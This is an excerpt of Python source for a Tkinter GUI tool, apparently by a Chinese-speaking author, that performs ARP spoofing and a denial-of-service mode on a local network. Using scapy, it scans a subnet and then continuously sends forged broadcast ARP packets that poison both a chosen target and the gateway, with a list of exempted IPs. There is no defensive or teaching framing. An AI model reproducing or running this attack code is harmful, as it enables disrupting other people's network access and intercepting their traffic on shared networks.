...
class ARPSpoofingApp:
    def __init__(self, root):
        ...
        self.start_button = tk.Button(
            root, text="开始ARP攻击", bg="red", command=self.start_spoofing)
        ...
        # DOSS
        self.scan_button = tk.Button(
            root, text="DOSS-OFF", bg="green", command=self.doss)
    ...
    def doss_s(self, vip):
        ...
        while self.spoofing and s == 0 and runarp == 'OFF':
            ...
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=vip, psrc=gateway_ip), verbose=0)
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=gateway_ip, psrc=vip), verbose=0)
            time.sleep(0.3)
    ...
    def arpsp(self, i):
        ...
        a = 0
        for b in target_ip_list:
            a += 1
            for j in afterdoorip_list:
                if b == j:
                    try:
                        del target_ip_list[a]
                    except IndexError:
                        return
        ...
        while self.spoofing and rundoss == 'OFF':
            runarp = 'ON'
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=target_ip, psrc=gateway_ip), verbose=0)
            # 发送arp数据包给被攻击IP
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                  ARP(pdst=gateway_ip, psrc=target_ip), verbose=0)
            time.sleep(0.1)
    ...
    def perform_arp_scan(self, subnet):
        ...
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                     ARP(pdst=subnet, psrc=gateway_ip), timeout=2, verbose=False)
        # 打印找到的主机在treeview中
        for _, rcv in ans:
            ip = rcv[ARP].psrc
            all_ip.append(ip)
